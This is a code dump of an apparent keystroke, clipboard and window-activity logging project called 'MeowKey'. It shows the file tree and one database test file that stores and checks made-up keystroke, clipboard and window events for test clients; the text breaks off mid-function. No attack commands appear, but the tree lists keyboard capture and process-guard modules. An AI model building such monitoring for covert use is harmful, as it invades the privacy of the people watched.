===== PROJECT TREE =====
.
â”œâ”€â”€ client
â”œâ”€â”€ client_cross.hpp
â”œâ”€â”€ client_main.cpp
â”œâ”€â”€ clipboard_monitor.hpp
â”œâ”€â”€ clipboard_monitor_windows.hpp
â”œâ”€â”€ code.txt
â”œâ”€â”€ concurrent_stress_test.cpp
â”œâ”€â”€ db_structures.hpp
â”œâ”€â”€ event_buffers.hpp
â”œâ”€â”€ guardian_exit
â”œâ”€â”€ guardian_exit.cpp
â”œâ”€â”€ guardian_exit_windows.cpp
â”œâ”€â”€ keyboard_capture.hpp
â”œâ”€â”€ keyboard_capture_windows.hpp
â”œâ”€â”€ launcher
â”œâ”€â”€ launcher_common.hpp
â”œâ”€â”€ launcher_linux.cpp
â”œâ”€â”€ launcher_windows_simple.cpp
â”œâ”€â”€ meowkey_database.hpp
â”œâ”€â”€ meowkey-full.tar.gz
â”œâ”€â”€ meowkey_server.db
â”œâ”€â”€ meowkey-server.tar.gz
â”œâ”€â”€ password_dialog_linux.hpp
â”œâ”€â”€ password_dialog_windows.hpp
â”œâ”€â”€ platform_detector.hpp
â”œâ”€â”€ process_guard_linux.hpp
â”œâ”€â”€ process_guard_windows.hpp
â”œâ”€â”€ server
â”œâ”€â”€ Server
â”‚Â Â  â”œâ”€â”€ api_server.hpp
â”‚Â Â  â”œâ”€â”€ events.hpp
â”‚Â Â  â”œâ”€â”€ server
â”‚Â Â  â”œâ”€â”€ server_cross.hpp
â”‚Â Â  â”œâ”€â”€ server_main.cpp
â”‚Â Â  â”œâ”€â”€ server_watchdog
â”‚Â Â  â””â”€â”€ server_watchdog.cpp
â”œâ”€â”€ socket_utils_cross.hpp
â”œâ”€â”€ test_api.cpp
â”œâ”€â”€ test_database.cpp
â”œâ”€â”€ test_read_db.cpp
â”œâ”€â”€ thread_safe_queue.hpp
â”œâ”€â”€ UI
â”‚Â Â  â”œâ”€â”€ api
â”‚Â Â  â”‚Â Â  â””â”€â”€ server.js
â”‚Â Â  â”œâ”€â”€ clients.html
â”‚Â Â  â”œâ”€â”€ css
â”‚Â Â  â”‚Â Â  â””â”€â”€ style.css
â”‚Â Â  â”œâ”€â”€ index.html
â”‚Â Â  â”œâ”€â”€ js
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ dashboard.js
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ main.js
â”‚Â Â  â”‚Â Â  â””â”€â”€ utils.js
â”‚Â Â  â”œâ”€â”€ package.json
â”‚Â Â  â”œâ”€â”€ package-lock.json
â”‚Â Â  â”œâ”€â”€ settings.html
â”‚Â Â  â””â”€â”€ waiting_room.html
â”œâ”€â”€ view_db.py
â”œâ”€â”€ .vscode
â”œâ”€â”€ window_monitor.hpp
â”œâ”€â”€ window_monitor_windows.hpp
â””â”€â”€ window_protector.hpp

7 directories, 55 files

===== FILE CONTENTS =====

===== FILE: ./concurrent_stress_test.cpp =====

// #include "meowkey_database.hpp"
// #include "event_buffers.hpp"
// #include <iostream>
// #include <vector>
// #include <chrono>
// #include <thread>
// #include <memory>
// #include <random>
// #include <string>

// using namespace std;

// uint64_t getTimestamp() {
//     return chrono::duration_cast<chrono::microseconds>(
//         chrono::system_clock::now().time_since_epoch()
//     ).count();
// }

// // Random string generator for realistic data
// string generateRandomString(size_t length) {
//     static const char alphanum[] =
//         "0123456789"
//         "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
//         "abcdefghijklmnopqrstuvwxyz"
//         " .,!?-";
    
//     static mt19937 rng(random_device{}());
//     uniform_int_distribution<> dist(0, sizeof(alphanum) - 2);
    
//     string result;
//     result.reserve(length);
//     for (size_t i = 0; i < length; ++i) {
//         result += alphanum[dist(rng)];
//     }
//     return result;
// }

// // Generate realistic clipboard content
// string generateClipboardContent() {
//     vector<string> paragraphs = {
//         "The quick brown fox jumps over the lazy dog. This sentence contains all letters of the alphabet.",
//         "In software engineering, a database is an organized collection of data stored and accessed electronically.",
//         "Small databases can be stored on a file system, while large databases are hosted on computer clusters.",
//         "B+ trees are balanced tree data structures that keep data sorted and allow searches, sequential access, insertions, and deletions in logarithmic time.",
//         "The buffer system helps reduce disk I/O by accumulating events in memory before writing them to disk in batches.",
//         "Concurrent access from multiple clients requires proper synchronization mechanisms to prevent data corruption.",
//         "This test simulates real-world usage with multiple users generating events simultaneously.",
//         "The system should handle all these events efficiently without data loss or corruption.",
//         "Space reclamation ensures that deleted client data doesn't waste storage space over time.",
//         "Proper indexing with B+ trees enables fast retrieval of historical events by timestamp."
//     };
    
//     static mt19937 rng(random_device{}());
//     uniform_int_distribution<> dist(0, paragraphs.size() - 1);
    
//     // Combine 2-4 random paragraphs
//     int num_paragraphs = 2 + (rng() % 3);
//     string content;
//     for (int i = 0; i < num_paragraphs; i++) {
//         content += paragraphs[dist(rng)] + "\n\n";
//     }
//     return content;
// }

// // Generate realistic window titles
// string generateWindowTitle() {
//     vector<string> applications = {
//         "Google Chrome", "Mozilla Firefox", "Visual Studio Code", "Terminal", 
//         "Microsoft Word", "Adobe Photoshop", "Slack", "Discord", "Zoom Meeting",
//         "File Explorer", "Notepad++", "IntelliJ IDEA", "Eclipse", "Postman",
//         "MySQL Workbench", "Wireshark", "Docker Desktop", "GitHub Desktop"
//     };
    
//     vector<string> activities = {
//         "writing code", "browsing internet", "reading documentation", "debugging",
//         "writing report", "designing UI", "team meeting", "presentation",
//         "file management", "note taking", "project development", "API testing",
//         "database query", "network analysis", "container management", "version control"
//     };
    
//     static mt19937 rng(random_device{}());
//     uniform_int_distribution<> app_dist(0, applications.size() - 1);
//     uniform_int_distribution<> act_dist(0, activities.size() - 1);
    
//     return applications[app_dist(rng)] + " - " + activities[act_dist(rng)];
// }

// string generateProcessName() {
//     vector<string> processes = {
//         "chrome.exe", "firefox.exe", "code.exe", "terminal.exe", "winword.exe",
//         "photoshop.exe", "slack.exe", "discord.exe", "zoom.exe", "explorer.exe",
//         "notepad++.exe", "idea.exe", "eclipse.exe", "postman.exe", "mysqlworkbench.exe",
//         "wireshark.exe", "docker.exe", "github.exe"
//     };
    
//     static mt19937 rng(random_device{}());
//     uniform_int_distribution<> dist(0, processes.size() - 1);
    
//     return processes[dist(rng)];
// }

// // Simulate a single user session
// void simulateUserSession(MeowKeyDatabase* db, const string& client_id, int duration_seconds) {
//     cout << "  Starting session for user: " << client_id << endl;
    
//     // Register/load client
//     ClientRecord record;
//     db->registerClient(client_id, record);
    
//     // Create session
//     ClientSession session(client_id, db);
    
//     auto start_time = chrono::steady_clock::now();
//     int event_count = 0;
    
//     while (chrono::duration_cast<chrono::seconds>(
//         chrono::steady_clock::now() - start_time).count() < duration_seconds) {
        
//         // Simulate typing (10-30 keystrokes per batch)
//         int keystrokes = 10 + (rand() % 21);
//         for (int i = 0; i < keystrokes; i++) {
//             string key = generateRandomString(1 + (rand() % 10));
//             session.addKeystroke(getTimestamp(), key);
//             event_count++;
//         }
        
//         // Simulate occasional copy-paste (clipboard event)
//         if (rand() % 5 == 0) { // 20% chance
//             string clipboard_content = generateClipboardContent();
//             session.addClipboard(getTimestamp(), clipboard_content);
//             event_count++;
//         }
        
//         // Simulate window switching
//         if (rand() % 3 == 0) { // 33% chance
//             string title = generateWindowTitle();
//             string process = generateProcessName();
//             session.addWindow(getTimestamp(), title, process);
//             event_count++;
//         }
        
//         // Small delay between batches
//         this_thread::sleep_for(chrono::milliseconds(50 + (rand() % 100)));
//     }
    
//     // Flush any remaining events
//     session.flushAll();
    
//     cout << "  Session completed for " << client_id 
//          << " (events: " << event_count << ")" << endl;
// }

// void ultimateConcurrentStressTest() {
//     cout << "\n" << string(60, '=') << endl;
//     cout << "ULTIMATE CONCURRENT STRESS TEST" << endl;
//     cout << "Simulating 10 concurrent users for 30 seconds" << endl;
//     cout << string(60, '=') << endl;
    
//     MeowKeyDatabase db("ultimate_test.db");
//     if (!db.open()) {
//         cerr << "Failed to open database" << endl;
//         return;
//     }
    
//     // Create 10 unique users
//     vector<string> user_ids;
//     for (int i = 1; i <= 10; i++) {
//         user_ids.push_back("user_" + to_string(i) + "_" + generateRandomString(5));
//     }
    
//     cout << "\nCreated 10 users:" << endl;
//     for (const auto& user : user_ids) {
//         cout << "  " << user << endl;
//     }
    
//     cout << "\nStarting concurrent simulation for 30 seconds..." << endl;
//     cout << "Each user will generate:" << endl;
//     cout << "  - Keystrokes (typing simulation)" << endl;
//     cout << "  - Clipboard events (copy-paste)" << endl;
//     cout << "  - Window events (app switching)" << endl;
    
//     auto test_start = chrono::steady_clock::now();
    
//     // Launch concurrent user sessions
//     vector<thread> user_threads;
//     for (const auto& user_id : user_ids) {
//         user_threads.emplace_back(simulateUserSession, &db, user_id, 30);
//     }
    
//     // Wait for all threads to complete
//     for (auto& thread : user_threads) {
//         thread.join();
//     }
    
//     auto test_end = chrono::steady_clock::now();
//     auto duration = chrono::duration_cast<chrono::milliseconds>(test_end - test_start);
    
//     cout << "\n" << string(60, '=') << endl;
//     cout << "CONCURRENT TEST COMPLETED!" << endl;
//     cout << "Total test duration: " << duration.count() << " ms" << endl;
    
//     // Show final statistics
//     db.printStats();
    
//     // Show individual user stats
//     cout << "\nUser Statistics:" << endl;
//     cout << string(40, '-') << endl;
//     for (const auto& user_id : user_ids) {
//         ClientRecord record;
//         if (db.getClientStats(user_id, record)) {
//             cout << "User: " << user_id << endl;
//             cout << "  Keystrokes: " << record.total_keystrokes << endl;
//             cout << "  Clipboard: " << record.total_clipboard << endl;
//             cout << "  Windows: " << record.total_windows << endl;
//             cout << "  Total Events: " << (record.total_keystrokes + record.total_clipboard + record.total_windows) << endl;
//             cout << endl;
//         }
//     }
    
//     // Test random queries to verify data integrity
//     cout << "\nVerifying data integrity with random queries..." << endl;
//     int verified_clients = 0;
//     for (const auto& user_id : user_ids) {
//         ClientRecord record;
//         if (db.getClientStats(user_id, record)) {
//             if (record.client_hash == ClientRecord::hashString(user_id)) {
//                 verified_clients++;
//             }
//         }
//     }
//     cout << "âœ“ Verified " << verified_clients << "/" << user_ids.size() << " clients" << endl;
    
//     // Test client deletion and re-creation
//     cout << "\nTesting client deletion and re-creation..." << endl;
//     if (!user_ids.empty()) {
//         string test_user = user_ids[0];
//         cout << "Deleting user: " << test_user << endl;
        
//         if (db.deleteClient(test_user)) {
//             cout << "âœ“ User deleted successfully" << endl;
            
//             // Try to re-register
//             ClientRecord new_record;
//             bool is_existing = db.registerClient(test_user, new_record);
//             cout << "Re-registered user. Is existing: " << is_existing 
//                  << " (should be false for newly created)" << endl;
//             cout << "New session count: " << new_record.session_count 
//                  << " (should be 1)" << endl;
//         }
//     }
    
//     db.close();
    
//     cout << "\n" << string(60, '=') << endl;
//     cout << "ULTIMATE STRESS TEST PASSED! ðŸŽ‰" << endl;
//     cout << "Database successfully handled:" << endl;
//     cout << "  - 10 concurrent users" << endl;
//     cout << "  - 30 seconds of continuous activity" << endl;
//     cout << "  - Mixed event types (keystrokes, clipboard, windows)" << endl;
//     cout << "  - Realistic data generation" << endl;
//     cout << "  - Thread-safe concurrent access" << endl;
//     cout << string(60, '=') << endl;
// }

// int main() {
//     cout << "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" << endl;
//     cout << "â•‘     ULTIMATE MEOWKEY DATABASE CONCURRENT STRESS TEST   â•‘" << endl;
//     cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" << endl;
    
//     // Run the test 3 times to ensure consistency
//     for (int run = 1; run <= 3; run++) {
//         cout << "\n\nRUN #" << run << " of 3" << endl;
//         cout << string(50, '=') << endl;
        
//         ultimateConcurrentStressTest();
        
//         if (run < 3) {
//             cout << "\nWaiting 2 seconds before next run..." << endl;
//             this_thread::sleep_for(chrono::seconds(2));
//         }
//     }
    
//     cout << "\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" << endl;
//     cout << "â•‘     ALL CONCURRENT TESTS COMPLETED SUCCESSFULLY!       â•‘" << endl;
//     cout << "â•‘     Database is READY FOR PRODUCTION DEPLOYMENT!       â•‘" << endl;
//     cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" << endl;
    
//     return 0;
// }


// #include "meowkey_database.hpp"
// #include "event_buffers.hpp"
// #include <iostream>
// #include <vector>
// #include <chrono>
// #include <thread>
// #include <memory>
// #include <random>
// #include <string>
// #include <iomanip>

// using namespace std;

// uint64_t getTimestamp() {
//     return chrono::duration_cast<chrono::microseconds>(
//         chrono::system_clock::now().time_since_epoch()
//     ).count();
// }

// // Generate introduction text for each user
// string generateIntroduction(const string& username) {
//     vector<string> intros = {
//         "Hi, I'm " + username + ". I'm a software engineer passionate about databases.",
//         "Hello! My name is " + username + ". I love working on data structures and algorithms.",
//         "I'm " + username + ", a database architect with 5 years of experience.",
//         "Hi there! I'm " + username + ". Currently working on distributed systems.",
//         "My name is " + username + ". I specialize in B+ tree implementations and storage engines."
//     };
//     static mt19937 rng(random_device{}());
//     uniform_int_distribution<> dist(0, intros.size() - 1);
//     return intros[dist(rng)];
// }

// // Generate clipboard content (multiline)
// string generateClipboardContent() {
//     vector<string> contents = {
//         "SELECT * FROM users WHERE active = 1;\nSELECT COUNT(*) FROM events;",
//         "CREATE TABLE logs (\n  id INT PRIMARY KEY,\n  timestamp BIGINT,\n  message TEXT\n);",
//         "git add .\ngit commit -m \"Fix concurrent access bug\"\ngit push origin main",
//         "TODO: Implement range queries\nTODO: Add data compression\nTODO: Optimize B+ tree splits",
//         "https://github.com/meowkey/database\nDocumentation: /docs/README.md\nIssues: github.com/issues"
//     };
//     static mt19937 rng(random_device{}());
//     uniform_int_distribution<> dist(0, contents.size() - 1);
//     return contents[dist(rng)];
// }

// // Generate window titles
// string generateWindowTitle() {
//     vector<string> windows = {
//         "Visual Studio Code - meowkey_database.hpp",
//         "Terminal - bash",
//         "Chrome - GitHub",
//         "File Explorer - /home/user/projects",
//         "Database Monitor - ultimate_test.db"
//     };
//     static mt19937 rng(random_device{}());
//     uniform_int_distribution<> dist(0, windows.size() - 1);
//     return windows[dist(rng)];
// }

// string generateProcessName() {
//     vector<string> processes = {
//         "code.exe",
//         "bash",
//         "chrome.exe",
//         "explorer.exe",
//         "mysqld.exe"
//     };
//     static mt19937 rng(random_device{}());
//     uniform_int_distribution<> dist(0, processes.size() - 1);
//     return processes[dist(rng)];
// }

// void testUserDataInsertion() {
//     cout << "\n" << string(70, '=') << endl;
//     cout << "MEOWKEY DATABASE - TARGETED DATA INSERTION AND RETRIEVAL TEST" << endl;
//     cout << string(70, '=') << endl;

//     MeowKeyDatabase db("test_retrieval.db");
//     if (!db.open()) {
//         cerr << "Failed to open database" << endl;
//         return;
//     }

//     // Define 5 users
//     vector<string> usernames = {"alice", "bob", "charlie", "diana", "eve"};
//     vector<ClientRecord> created_clients;

//     cout << "\n[PHASE 1] Registering 5 users..." << endl;
//     cout << string(70, '-') << endl;

//     for (const auto& username : usernames) {
//         ClientRecord record;
//         bool is_existing = db.registerClient(username, record);
//         created_clients.push_back(record);
//         cout << "âœ“ User registered: " << username 
//              << " (Hash: " << record.client_hash << ")" << endl;
//     }

//     // Insert keystroke introduction for each user
//     cout << "\n[PHASE 2] Inserting keystroke introductions..." << endl;
//     cout << string(70, '-') << endl;

//     for (size_t i = 0; i < usernames.size(); ++i) {
//         const string& username = usernames[i];
//         uint32_t client_hash = created_clients[i].client_hash;

//         string intro = generateIntroduction(username);
        
//         // Create keystroke event for intro (in chunks to simulate typing)
//         size_t chunk_size = 15; // Characters per keystroke event
//         for (size_t pos = 0; pos < intro.length(); pos += chunk_size) {
//             KeystrokeEvent event;
//             event.timestamp = getTimestamp();
//             event.client_hash = client_hash;
            
//             size_t len = min(chunk_size, intro.length() - pos);
//             strncpy(event.key, intro.substr(pos, len).c_str(), sizeof(event.key) - 1);
//             event.key[sizeof(event.key) - 1] = '\0';
            
//             db.insertKeystroke(client_hash, event);
//             this_thread::sleep_for(chrono::milliseconds(10));
//         }
//         cout << "âœ“ Keystroke introduction inserted for " << username << endl;
//     }

//     // Insert clipboard events for each user
//     cout << "\n[PHASE 3] Inserting clipboard events..." << endl;
//     cout << string(70, '-') << endl;

//     for (size_t i = 0; i < usernames.size(); ++i) {
//         const string& username = usernames[i];
//         uint32_t client_hash = created_clients[i].client_hash;

//         for (int clip = 0; clip < 3; ++clip) {
//             ClipboardEvent event;
//             event.timestamp = getTimestamp();
//             event.client_hash = client_hash;
            
//             string content = generateClipboardContent();
//             strncpy(event.content, content.c_str(), sizeof(event.content) - 1);
//             event.content[sizeof(event.content) - 1] = '\0';
            
//             db.insertClipboard(client_hash, event);
//             cout << "âœ“ Clipboard event " << (clip + 1) << " inserted for " << username << endl;
//             this_thread::sleep_for(chrono::milliseconds(20));
//         }
//     }

//     // Insert window navigation events for each user
//     cout << "\n[PHASE 4] Inserting window navigation events..." << endl;
//     cout << string(70, '-') << endl;

//     for (size_t i = 0; i < usernames.size(); ++i) {
//         const string& username = usernames[i];
//         uint32_t client_hash = created_clients[i].client_hash;

//         for (int win = 0; win < 4; ++win) {
//             WindowEvent event;
//             event.timestamp = getTimestamp();
//             event.client_hash = client_hash;
            
//             string title = generateWindowTitle();
//             string process = generateProcessName();
            
//             // FIXED: Use correct member names from WindowEvent structure
//             strncpy(event.title, title.c_str(), sizeof(event.title) - 1);
//             event.title[sizeof(event.title) - 1] = '\0';
            
//             strncpy(event.process, process.c_str(), sizeof(event.process) - 1);
//             event.process[sizeof(event.process) - 1] = '\0';
            
//             db.insertWindow(client_hash, event);
//             cout << "âœ“ Window event " << (win + 1) << " inserted for " << username << endl;
//             this_thread::sleep_for(chrono::milliseconds(15));
//         }
//     }

//     // Retrieve and print all data for each client
//     cout << "\n[PHASE 5] Retrieving and printing all saved data for each client..." << endl;
//     cout << string(70, '=') << endl;

//     for (size_t i = 0; i < usernames.size(); ++i) {
//         const string& username = usernames[i];
        
//         QueryResult result;
//         if (!db.queryClientAllEvents(username, result)) {
//             cerr << "Failed to retrieve data for " << username << endl;
//             continue;
//         }

//         cout << "\n" << string(70, '=') << endl;
//         cout << "CLIENT: " << username << endl;
//         cout << string(70, '=') << endl;

//         // Print keystroke events
//         cout << "\n[KEYSTROKES] (" << result.keystrokes.size() << " events)" << endl;
//         cout << string(70, '-') << endl;
//         for (size_t j = 0; j < result.keystrokes.size(); ++j) {
//             const auto& ks = result.keystrokes[j];
//             cout << "  " << (j + 1) << ". Timestamp: " << ks.timestamp 
//                  << " | Key: \"" << ks.key << "\"" << endl;
//         }

//         // Print clipboard events
//         cout << "\n[CLIPBOARD] (" << result.clipboard_events.size() << " events)" << endl;
//         cout << string(70, '-') << endl;
//         for (size_t j = 0; j < result.clipboard_events.size(); ++j) {
//             const auto& cb = result.clipboard_events[j];
//             cout << "  " << (j + 1) << ". Timestamp: " << cb.timestamp << endl;
//             cout << "     Content:\n";
            
//             // Print content with line wrapping
//             string content(cb.content);
//             size_t pos = 0;
//             while (pos < content.length()) {
//                 size_t end = min(pos + 60, content.length());
//                 if (end < content.length() && content[end] != '\n') {
//                     size_t newline_pos = content.find('\n', pos);
//                     if (newline_pos != string::npos && newline_pos < end) {
//                         end = newline_pos;
//                     }
//                 }
//                 cout << "     " << content.substr(pos, end - pos) << endl;
//                 pos = end + 1;
//             }
//         }

//         // Print window events
//         cout << "\n[WINDOW NAVIGATION] (" << result.window_events.size() << " events)" << endl;
//         cout << string(70, '-') << endl;
//         for (size_t j = 0; j < result.window_events.size(); ++j) {
//             const auto& win = result.window_events[j];
//             cout << "  " << (j + 1) << ". Timestamp: " << win.timestamp << endl;
//             cout << "     Title: " << win.title << endl;
//             cout << "     Process: " << win.process << endl;
//         }

//         // Print summary
//         cout << "\n[SUMMARY]" << endl;
//         cout << "  Total Keystrokes: " << result.keystrokes.size() << endl;
//         cout << "  Total Clipboard Events: " << result.clipboard_events.size() << endl;
//         cout << "  Total Window Events: " << result.window_events.size() << endl;
//         cout << "  TOTAL EVENTS: " << result.totalEvents() << endl;
//     }

//     // Print database statistics
//     cout << "\n" << string(70, '=') << endl;
//     cout << "FINAL DATABASE STATISTICS" << endl;
//     cout << string(70, '=') << endl;
//     db.printStats();

//     db.close();

//     cout << "\n" << string(70, '=') << endl;
//     cout << "âœ… TEST COMPLETED SUCCESSFULLY!" << endl;
//     cout << "All user data was inserted and retrieved successfully." << endl;
//     cout << string(70, '=') << endl;
// }

// int main() {
//     cout << "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" << endl;
//     cout << "â•‘   MEOWKEY DATABASE - DATA INSERTION & RETRIEVAL TEST            â•‘" << endl;
//     cout << "â•‘   Testing: 5 Users | Keystrokes | Clipboard | Window Events    â•‘" << endl;
//     cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" << endl;

//     testUserDataInsertion();

//     return 0;
// }


#include "meowkey_database.hpp"
#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <chrono>
#include <thread>
#include <random>
#include <iomanip>
#include <cassert>

using namespace std;

// Hardcoded test data - unique for each client and event type
struct TestEvent {
    uint64_t timestamp;
    string content;
};

struct TestClientData {
    string id;
    vector<TestEvent> keystrokes;  // key press events
    vector<TestEvent> clipboard;   // copy-paste events  
    vector<TestEvent> windows;     // window change events
};

// Generate test data - each client gets unique, verifiable content
vector<TestClientData> generateTestData() {
    vector<TestClientData> clients;
    
    // Client 1: Alice
    {
        TestClientData alice;
        alice.id = "alice_test";
        
        // Keystrokes (unique sentences)
        alice.keystrokes.push_back({1234567890000, "Hello, this is Alice's first keystroke."});
        alice.keystrokes.push_back({1234567891000, "Database storage verification test."});
        alice.keystrokes.push_back({1234567892000, "Testing B+ tree insertion and retrieval."});
        alice.keystrokes.push_back({1234567893000, "Each event has unique timestamp and content."});
        
        // Clipboard events (unique content)
        alice.clipboard.push_back({1234567894000, "SELECT * FROM users WHERE id = 'alice';"});
        alice.clipboard.push_back({1234567895000, "git commit -m \"Alice's database test commit\""});
        alice.clipboard.push_back({1234567896000, "Lorem ipsum dolor sit amet, consectetur adipiscing elit."});
        
        // Window events
        alice.windows.push_back({1234567897000, "Terminal|bash"});
        alice.windows.push_back({1234567898000, "VS Code|code.exe"});
        alice.windows.push_back({1234567899000, "Chrome|chrome.exe"});
        
        clients.push_back(alice);
    }
    
    // Client 2: Bob
    {
        TestClientData bob;
        bob.id = "bob_test";
        
        // Keystrokes
        bob.keystrokes.push_back({2234567890000, "Bob's typing test for verification."});
        bob.keystrokes.push_back({2234567891000, "Ensuring data persistence across sessions."});
        bob.keystrokes.push_back({2234567892000, "Thread-safe concurrent access test."});
        
        // Clipboard
        bob.clipboard.push_back({2234567893000, "UPDATE settings SET value = 'bob_pref' WHERE user = 'bob';"});
        bob.clipboard.push_back({2234567894000, "git branch -b bob-feature-database-test"});
        bob.clipboard.push_back({2234567895000, "Sed ut perspiciatis unde omnis iste natus error."});
        
        // Windows
        bob.windows.push_back({2234567896000, "MySQL Workbench|mysql.exe"});
        bob.windows.push_back({2234567897000, "File Explorer|explorer.exe"});
        
        clients.push_back(bob);
    }
    
    // Client 3: Charlie
    {
        TestClientData charlie;
        charlie.id = "charlie_test";
        
        // Keystrokes
        charlie.keystrokes.push_back({3234567890000, "Charlie's data integrity verification."});
        charlie.keystrokes.push_back({3234567891000, "Testing multi-client concurrent writes."});
        charlie.keystrokes.push_back({3234567892000, "Hash table collision handling test."});
        charlie.keystrokes.push_back({3234567893000, "Free space management verification."});
        charlie.keystrokes.push_back({3234567894000, "B+ tree node splitting validation."});
        
        // Clipboard
        charlie.clipboard.push_back({3234567895000, "DELETE FROM logs WHERE timestamp < 1234567890000;"});
        charlie.clipboard.push_back({3234567896000, "docker run -d --name test-db postgres:latest"});
        charlie.clipboard.push_back({3234567897000, "At vero eos et accusamus et iusto odio dignissimos."});
        charlie.clipboard.push_back({3234567898000, "Temporibus autem quibusdam et aut officiis debitis."});
        
        // Windows
        charlie.windows.push_back({3234567899000, "Docker Desktop|docker.exe"});
        charlie.windows.push_back({3234567900000, "Postman|postman.exe"});
        charlie.windows.push_back({3234567901000, "IntelliJ IDEA|idea.exe"});
        charlie.windows.push_back({3234567902000, "Slack|slack.exe"});
        
        clients.push_back(charlie);
    }
    
    return clients;
}

// Store test data for a client
void storeClientData(MeowKeyDatabase& db, const TestClientData& client) {
    cout << "\nðŸ“ Storing data for client: " << client.id << endl;
    
    // Register client
    ClientRecord record;
    bool isExisting = db.registerClient(client.id, record);
    uint32_t client_hash = record.client_hash;
    
    cout << "  Client hash: " << client_hash << endl;
    cout << "  Is existing client: " << (isExisting ? "YES" : "NO") << endl;
    
    // Store keystrokes
    for (size_t i = 0; i < client.keystrokes.size(); i++) {
        KeystrokeEvent ks;
        ks.timestamp = client.keystrokes[i].timestamp;
        ks.client_hash = client_hash;
        strncpy(ks.key, client.keystrokes[i].content.c_str(), sizeof(ks.key) - 1);
        ks.key[sizeof(ks.key) - 1] = '\0';
        
        db.insertKeystroke(client_hash, ks);
        cout << "    âœ“ Keystroke " << (i+1) << " stored: " << ks.key << endl;
        
        // Small delay to ensure unique timestamps
        this_thread::sleep_for(chrono::microseconds(100));
    }
    
    // Store clipboard events
    for (size_t i = 0; i < client.clipboard.size(); i++) {
        ClipboardEvent cb;
        cb.timestamp = client.clipboard[i].timestamp;
        cb.client_hash = client_hash;
        strncpy(cb.content, client.clipboard[i].content.c_str(), sizeof(cb.content) - 1);
        cb.content[sizeof(cb.content) - 1] = '\0';
        
        db.insertClipboard(client_hash, cb);
        cout << "    âœ“ Clipboard " << (i+1) << " stored: " << endl;
        cout << "      " << cb.content << endl;
        
        this_thread::sleep_for(chrono::microseconds(100));
    }
    
    // Store window events
    for (size_t i = 0; i < client.windows.size(); i++) {
        WindowEvent win;
        win.timestamp = client.windows[i].timestamp;
        win.client_hash = client_hash;
        
        // Parse title|process
        size_t pipe_pos = client.windows[i].content.find('|');
        string title = client.windows[i].content.substr(0, pipe_pos);
        string process = client.windows[i].content.substr(pipe_pos + 1);
        
        strncpy(win.title, title.c_str(), sizeof(win.title) - 1);
        win.title[sizeof(win.title) - 1] = '\0';
        strncpy(win.process, process.c_str(), sizeof(win.process) - 1);
        win.process[sizeof(win.process) - 1] = '\0';
        
        db.insertWindow(client_hash, win);
        cout << "    âœ“ Window " << (i+1) << " stored: " << win.title << " (" << win.process << ")" << endl;
        
        this_thread::sleep_for(chrono::microseconds(100));
    }
}

// Verify retrieved data matches stored data
bool verifyClientData(const TestClientData& stored, const QueryResult& retrieved) {
    bool all_correct = true;
    
    cout << "\nðŸ” Verifying data for client: " << stored.id << endl;
    
    // Verify keystrokes count
    if (retrieved.keystrokes.size() != stored.keystrokes.size()) {
        cout << "  âŒ Keystroke count mismatch!" << endl;
        cout << "     Expected: " << stored.keystrokes.size() 
             << ", Got: " << retrieved.keystrokes.size() << endl;
        all_correct = false;
    } else {
        cout << "  âœ“ Keystrokes count: " << retrieved.keystrokes.size() << endl;
    }
    
    // Verify clipboard count
    if (retrieved.clipboard_events.size() != stored.clipboard.size()) {
        cout << "  âŒ Clipboard count mismatch!" << endl;
        cout << "     Expected: " << stored.clipboard.size() 
             << ", Got: " << retrieved.clipboard_events.size() << endl;
        all_correct = false;
    } else {
        cout << "  âœ“ Clipboard count: " << retrieved.clipboard_events.size() << endl;
    }
    
    // Verify window count
    if (retrieved.window_events.size() != stored.windows.size()) {
        cout << "  âŒ Window events count mismatch!" << endl;
        cout << "     Expected: " << stored.windows.size() 
             << ", Got: " << retrieved.window_events.size() << endl;
        all_correct = false;
    } else {
        cout << "  âœ“ Window events count: " << retrieved.window_events.size() << endl;
    }
    
    if (!all_correct) {
        return false;
    }
    
    // Verify keystroke content byte-by-byte
    cout << "\n  Verifying keystroke content..." << endl;
    for (size_t i = 0; i < stored.keystrokes.size(); i++) {
        string expected = stored.keystrokes[i].content;
        string actual = retrieved.keystrokes[i].key;
        
        if (expected != actual) {
            cout << "  âŒ Keystroke " << (i+1) << " content mismatch!" << endl;
            cout << "     Expected: \"" << expected << "\"" << endl;
            cout << "     Got:      \"" << actual << "\"" << endl;
            all_correct = false;
        } else {
            cout << "    âœ“ Keystroke " << (i+1) << " correct" << endl;
        }
        
        // Verify timestamp
        if (retrieved.keystrokes[i].timestamp != stored.keystrokes[i].timestamp) {
            cout << "  âŒ Keystroke " << (i+1) << " timestamp mismatch!" << endl;
            all_correct = false;
        }
    }
    
    // Verify clipboard content
    cout << "\n  Verifying clipboard content..." << endl;
    for (size_t i = 0; i < stored.clipboard.size(); i++) {
        string expected = stored.clipboard[i].content;
        string actual = retrieved.clipboard_events[i].content;
        
        if (expected != actual) {
